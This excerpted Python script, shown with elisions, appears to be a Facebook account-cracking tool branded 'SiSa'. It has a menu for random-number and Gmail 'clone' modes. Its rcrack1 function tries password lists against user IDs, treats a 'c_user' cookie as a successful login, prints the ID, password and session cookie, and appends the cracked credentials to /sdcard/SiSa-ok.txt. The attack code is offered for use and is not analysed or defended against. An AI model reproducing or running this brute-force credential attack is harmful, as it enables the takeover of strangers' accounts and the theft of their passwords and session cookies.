...
for xd in range(10000):
	...
	ugen.append(uakua)
os.system('xdg-open https://facebook.com/sisagaming45/')
logo = ("""   
\033[1;32m
\033[1;33m
\033[1;34m  
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        print(f" \033[38;5;46m♧♧♧♧♧♧♧♧♧♧♧♧🖤SISA🖤♧♧♧♧♧♧♧♧♧♧♧♧♧♧♧")
        print(" [1] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙉𝙐𝙈𝘽𝙀𝙍-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂")
        print(" [2] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙂𝙈𝘼𝙄𝙇-𝘾𝙇𝙊𝙉𝙀  [𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
        print(" [0] \033[38;5;46mEXIT-WAY")
...
def num():
    ...
    print(' [+] Ids saved in SiSa-ok.txt,SiSa-cp.txt')
...
def gml():
    ...
    print(' [+] \033[38;5;46mIds saved in SiSa-ok.txt,SiSa-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[\033[38;5;46mSiSa]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SiSa-OK🐼] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/SiSa-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[38;5;46m[SISA] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()